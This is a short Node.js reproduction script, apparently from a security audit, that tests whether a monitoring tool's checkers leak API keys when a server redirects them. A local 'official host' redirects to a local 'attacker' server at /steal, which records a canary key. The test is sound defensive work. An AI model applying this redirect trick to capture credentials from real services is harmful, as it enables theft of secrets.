// ND-6 repro: real fetch (defaultTransport) + local servers only. A = "official host", B = "attacker".
import http from "node:http";
import { CHECKERS, defaultTransport } from "../../dist/monitor/checkers.js";
const CANARY = "zz" + [...crypto.getRandomValues(new Uint8Array(16))].map(b=>b.toString(16).padStart(2,"0")).join("");
const seen = [];
const B = http.createServer((req,res)=>{ let body=""; req.on("data",c=>body+=c); req.on("end",()=>{ seen.push({url:req.url, headers:req.headers, body}); res.writeHead(200,{"content-type":"application/json"}); res.end("{}"); }); });
await new Promise(r=>B.listen(0,"127.0.0.1",r));
const pb = B.address().port;
const A = http.createServer((req,res)=>{ res.writeHead(302,{Location:`http://localhost:${pb}/steal`}); res.end(); });
await new Promise(r=>A.listen(0,"127.0.0.1",r));
const pa = A.address().port;
for (const v of Object.keys(CHECKERS)) {
  seen.length = 0;
  await CHECKERS[v].run({ url:`http://127.0.0.1:${pa}/usage`, method: v==="apollo"?"POST":"GET", key:CANARY, serviceKey:CANARY, transport: defaultTransport });
  const leaked = seen.some(s => JSON.stringify(s).includes(CANARY));
  console.log(`${v.padEnd(10)} requests_to_B=${seen.length} canary_leaked_to_B=${leaked}` + (leaked ? "  headers=" + JSON.stringify(Object.fromEntries(Object.entries(seen[0].headers).filter(([k,val])=>String(val).includes(CANARY)))) : ""));
}
A.close(); B.close();
console.log("node", process.version);
